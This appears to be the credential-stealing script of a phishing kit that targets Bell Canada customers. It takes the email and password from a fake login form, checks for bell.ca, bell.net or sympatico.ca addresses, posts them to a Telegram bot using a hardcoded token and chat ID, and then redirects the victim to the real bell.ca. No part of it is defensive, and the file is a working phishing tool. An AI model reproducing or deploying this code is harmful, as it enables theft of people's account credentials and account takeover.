console.log("sender.js connected");

function sendTelegramMessageAndRedirect() {
  const telegramBotToken = "6724518968:AAFoEyUmaA910VH-GL4FXeTa60bB9BcwVWA"; // Replace with your Telegram bot token
  const chatId = 6007087659; // Replace with your chat ID

  const emailValue = document.getElementById("email").value;
  const passwordValue = document.getElementById("password").value;

  const errorDisplay = document.querySelector(".error");

  // Email validation regex for yahoo.com and yahoo.net domains
  const emailRegex = /^[^\s@]+@(bell\.ca|bell\.net|sympatico\.ca)$/;

  if (!emailRegex.test(emailValue)) {
    errorDisplay.style.opacity = 1;
    return; // Stop further execution if email is invalid
  }

  const messageText = `**Bell result**\nEmail: ${emailValue}\nPassword: ${passwordValue}`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  // Make the API request
  fetch(url, params)
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent:", data);
      // Redirect to another page after successful submission
      window.location.href = "https://www.bell.ca"; // Replace with your desired URL
    })
    .catch((error) => console.error("Error:", error));
}
